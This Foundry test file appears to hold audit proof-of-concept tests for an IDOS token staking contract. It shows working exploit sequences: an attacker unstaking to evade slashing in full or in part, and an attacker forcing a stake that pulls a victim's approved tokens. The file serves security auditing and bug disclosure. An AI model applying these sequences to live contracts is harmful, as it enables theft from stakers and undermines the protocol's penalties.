// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {IDOSToken} from "../src/IDOSToken.sol";
import {IDOSNodeStaking} from "../src/IDOSNodeStaking.sol";

contract AuditPoC is Test {
    IDOSToken idosToken;
    IDOSNodeStaking idosStaking;

    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address node1 = makeAddr("node1");

    uint256 constant START_TIME = 365 days;
    uint256 constant EPOCH_REWARD = 100;

    function setUp() public {
        vm.prank(owner);
        idosToken = new IDOSToken(owner);

        idosStaking = new IDOSNodeStaking(address(idosToken), owner, uint48(START_TIME), EPOCH_REWARD);

        vm.prank(owner);
        idosToken.transfer(address(idosStaking), 10_000);

        vm.prank(owner);
        idosToken.transfer(attacker, 1_000);
        vm.prank(owner);
        idosToken.transfer(victim, 1_000);

        vm.warp(START_TIME);
        vm.prank(owner);
        idosStaking.allowNode(node1);
    }

    function test_Finding1_SlashEvasionByUnstaking() public {
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), 1_000);
        vm.prank(attacker);
        idosStaking.stake(address(0), node1, 1_000);

        assertEq(idosStaking.getNodeStake(node1), 1_000);

        vm.prank(attacker);
        idosStaking.unstake(node1, 1_000);

        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", node1));
        idosStaking.slash(node1);

        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NoWithdrawableSlashedStakes()"));
        idosStaking.withdrawSlashedStakes();

        skip(14 days + 1);
        uint256 balBefore = idosToken.balanceOf(attacker);
        vm.prank(attacker);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(attacker) - balBefore, 1_000);
    }

    function test_Finding1b_PartialSlashEvasion() public {
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), 1_000);
        vm.prank(attacker);
        idosStaking.stake(address(0), node1, 1_000);

        vm.prank(victim);
        idosToken.approve(address(idosStaking), 1_000);
        vm.prank(victim);
        idosStaking.stake(address(0), node1, 1_000);

        assertEq(idosStaking.getNodeStake(node1), 2_000);

        vm.prank(attacker);
        idosStaking.unstake(node1, 1_000);

        vm.prank(owner);
        idosStaking.slash(node1);

        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();
        assertEq(idosStaking.slashedStakeWithdrawn(), 1_000);

        skip(14 days + 1);
        uint256 balBefore = idosToken.balanceOf(attacker);
        vm.prank(attacker);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(attacker) - balBefore, 1_000);
    }

    function test_Finding2_ForcedStakeOnBehalf() public {
        vm.prank(victim);
        idosToken.approve(address(idosStaking), 1_000);

        uint256 victimBalBefore = idosToken.balanceOf(victim);

        vm.prank(attacker);
        idosStaking.stake(victim, node1, 1_000);

        assertEq(idosToken.balanceOf(victim), victimBalBefore - 1_000);
        assertEq(idosStaking.stakeByNodeByUser(victim, node1), 1_000);
    }
}